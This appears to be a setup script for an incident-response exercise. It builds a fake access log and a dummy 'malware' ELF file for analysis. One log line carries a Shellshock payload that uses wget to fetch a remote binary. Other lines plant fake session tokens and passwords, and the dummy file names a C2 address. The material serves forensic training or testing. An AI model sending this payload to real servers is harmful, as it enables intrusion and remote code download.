#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/incident_data

    cat << 'EOF' > /home/user/incident_data/access.log
192.168.1.10 - - [10/Oct/2023:13:55:36 -0700] "GET /login HTTP/1.1" 200 2326 "-" "Mozilla/5.0" "session_token=abc123def; password=supersecret"
10.0.5.55 - - [10/Oct/2023:13:58:11 -0700] "GET /cgi-bin/status HTTP/1.1" 200 105 "-" "() { :; }; wget http://10.0.5.55/malware -O /tmp/dropped_malware.elf" "session_token=xyz987"
192.168.1.12 - - [10/Oct/2023:14:00:01 -0700] "POST /upload HTTP/1.1" 403 512 "-" "curl/7.68.0" "password=hackerpwd"
EOF

    printf '\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' > /home/user/incident_data/dropped_malware.elf
    echo "Some random binary garbage data" >> /home/user/incident_data/dropped_malware.elf
    echo "C2_SERVER: 203.0.113.85" >> /home/user/incident_data/dropped_malware.elf

    chmod -R 777 /home/user
